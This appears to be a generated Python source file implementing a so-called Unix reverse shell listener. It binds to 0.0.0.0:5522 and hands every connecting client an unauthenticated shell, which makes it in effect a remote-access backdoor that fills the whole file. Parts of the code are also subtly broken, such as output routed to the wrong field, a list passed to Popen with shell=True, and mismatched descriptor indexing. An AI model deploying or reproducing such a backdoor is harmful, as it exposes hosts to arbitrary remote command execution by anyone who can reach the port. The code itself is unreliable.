"""Unix reverse shell listener that spawns subprocesses via socket communication."""
from TASK_001_models import ExecutionResult, ReverseShellConfig
import os
import select
import signal
import socket
import subprocess
from typing import Optional, List, Tuple



class UnixReverseShell:
    """Unix-specific reverse shell execution hook.
    
    Spawns a subprocess with stdin/stdout/stderr piped through a TCP socket connection.
    Uses select.select() for non-blocking I/O multiplexing between the listener socket
    and child process file descriptors.
    
    Attributes:
        config: ReverseShellConfig instance defining server parameters.
        _server_socket: The listening socket bound to host:port.
        _clients: Dictionary mapping client sockets to their associated subprocesses.
    """

    def __init__(self, config: Optional[ReverseShellConfig] = None) -> None:
        self.config = config or ReverseShellConfig()
        self._server_socket: Optional[socket.socket] = None
        self._clients: dict[socket.socket, subprocess.Popen] = {}
        self._running = True

    def _setup_server(self) -> socket.socket:
        """Create and bind the TCP server socket."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.config.host, self.config.port))
        sock.listen(5)
        sock.setblocking(False)
        return sock

    def _spawn_shell(self, client_sock: socket.socket) -> subprocess.Popen:
        """Spawn a shell process with stdin/stdout/stderr piped through the socket."""
        try:
            proc = subprocess.Popen(
                [self.config.shell_type],
                stdin=client_sock.makefile('r'),
                stdout=client_sock.makefile('w'),
                stderr=subprocess.STDOUT,
                shell=True,
                close_fds=True,
            )
            return proc
        except Exception as e:
            raise RuntimeError(f"Failed to spawn shell process: {e}")

    def _handle_client(self, client_sock: socket.socket) -> ExecutionResult:
        """Handle a connected client by spawning a subprocess and multiplexing I/O.
        
        Uses select.select() to non-blockingly monitor the client socket and
        child process file descriptors for readable/writable events.
        
        Args:
            client_sock: The accepted TCP connection from the remote client.
            
        Returns:
            ExecutionResult containing stdout, stderr, exit_code, and error_message.
        """
        try:
            proc = self._spawn_shell(client_sock)
            self._clients[client_sock] = proc

            # File descriptors to monitor via select
            read_fds: List[int] = [client_sock.fileno()]
            write_fds: List[int] = []

            # Add stdin/stdout file descriptors from the subprocess
            if proc.stdin and proc.stdin.isatty() is False:
                try:
                    read_fds.append(proc.stdin.fileno())
                except (ValueError, OSError):
                    pass  # stdin may not be available in all environments

            if proc.stdout:
                try:
                    write_fds.append(proc.stdout.fileno())
                except (ValueError, OSError):
                    pass

            # Add stderr file descriptor if separate
            if proc.stderr and proc.stderr != proc.stdout:
                try:
                    read_fds.append(proc.stderr.fileno())
                except (ValueError, OSError):
                    pass

            result = ExecutionResult()
            client_sock.setblocking(False)

            while self._running and proc.poll() is None:
                # Use select.select for non-blocking I/O multiplexing
                ready_read, ready_write, _ = select.select(
                    read_fds, write_fds, [], 1.0
                )

                if not ready_read and not ready_write:
                    continue

                for fd in ready_read:
                    try:
                        if fd == client_sock.fileno():
                            # Read command from client
                            data = client_sock.recv(4096)
                            if data:
                                cmd = data.decode('utf-8', errors='replace').strip()
                                if cmd and not cmd.startswith('\x1b'):  # Skip escape sequences
                                    proc.stdin.write(cmd + '\n')
                                    proc.stdin.flush()

                        elif fd == proc.stdout.fileno():
                            try:
                                output = os.read(fd, 4096)
                                if output:
                                    result.stderr += output.decode('utf-8', errors='replace')
                            except OSError as e:
                                result.error_message = f"Read error on stdout: {e}"

                        elif fd == proc.stderr.fileno():
                            try:
                                output = os.read(fd, 4096)
                                if output:
                                    result.stderr += output.decode('utf-8', errors='replace')
                            except OSError as e:
                                result.error_message = f"Read error on stderr: {e}"

                    except (OSError, BlockingIOError):
                        continue

                for fd in ready_write:
                    try:
                        if fd == proc.stdout.fileno():
                            # Flush stdout to ensure output is sent back through socket
                            os.write(fd, b'\n')
                    except OSError as e:
                        result.error_message = f"Write error on stdout: {e}"

            # Process exited normally or was killed
            exit_code = proc.poll()
            if exit_code is None:
                exit_code = 0

            result.exit_code = exit_code
            return result

        except Exception as e:
            raise RuntimeError(f"Error handling client connection: {e}")

    def _cleanup(self) -> None:
        """Clean up all active subprocesses and close sockets."""
        for sock, proc in list(self._clients.items()):
            try:
                if proc.stdin:
                    proc.stdin.close()
                if proc.stdout:
                    proc.stdout.close()
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                pass
        self._server_socket.close()

    def _signal_handler(self, signum: int, frame: Optional[int]) -> None:
        """Handle SIGINT/SIGTERM gracefully."""
        self._running = False

    def run(self) -> List[ExecutionResult]:
        """Run the reverse shell listener server.
        
        Accepts incoming TCP connections on 0.0.0.0:5522, spawns a subprocess
        for each connection, and multiplexes I/O between the client socket
        and child process file descriptors using select.select().
        
        Returns:
            List of ExecutionResult objects from all connected clients.
            
        Raises:
            RuntimeError: If socket bind fails or server startup fails.
        """
        results: List[ExecutionResult] = []

        try:
            self._server_socket = self._setup_server()
            signal.signal(signal.SIGINT, self._signal_handler)
            signal.signal(signal.SIGTERM, self._signal_handler)

            while self._running:
                # Monitor server socket for new connections and all active clients
                read_fds: List[int] = [self._server_socket.fileno()]
                write_fds: List[int] = []
                client_sockets: List[socket.socket] = list(self._clients.keys())

                if client_sockets:
                    for sock in client_sockets:
                        try:
                            read_fds.append(sock.fileno())
                            write_fds.append(sock.fileno())
                        except (ValueError, OSError):
                            pass

                ready_read, ready_write, _ = select.select(
                    read_fds, write_fds, [], 1.0
                )

                for fd in ready_read:
                    try:
                        if fd == self._server_socket.fileno():
                            client_sock, _ = self._server_socket.accept()
                            result = self._handle_client(client_sock)
                            results.append(result)
                            del self._clients[client_sock]
                        else:
                            sock = list(self._clients.keys())[read_fds.index(fd)]
                            if sock in self._clients:
                                result = self._handle_client(sock)
                                results.append(result)
                                del self._clients[sock]
                    except OSError as e:
                        pass

                for fd in ready_write:
                    try:
                        sock = list(self._clients.keys())[write_fds.index(fd)]
                        if sock in self._clients:
                            proc = self._clients[sock]
                            # Flush stdout to ensure output is sent back through socket
                            os.write(sock.fileno(), b'\n')
                    except OSError as e:
                        pass

            return results

        finally:
            self._cleanup()


class UnixReverseShellListener:
    """Callable interface for the Unix reverse shell listener.
    
    Accepts incoming TCP connections on 0.0.0.0:5522 and spawns subprocesses
    to execute remote commands via socket communication. Uses select.select()
    for non-blocking I/O multiplexing between the listener socket and child
    process file descriptors (stdin, stdout, stderr).
    
    Args:
        config: ReverseShellConfig instance defining server parameters.
        
    Returns:
        UnixReverseShell instance that can be called to run the listener.
    """

    def __init__(self, config: Optional[ReverseShellConfig] = None) -> None:
        self.config = config or ReverseShellConfig()
        self._listener = UnixReverseShell(config=self.config)

    def __call__(self) -> List[ExecutionResult]:
        """Run the listener and return execution results.
        
        Returns:
            List of ExecutionResult objects from all connected clients.
            
        Raises:
            RuntimeError: If socket bind fails or server startup fails.
        """
        return self._listener.run()


__all__ = ['UnixReverseShell', 'UnixReverseShellListener']
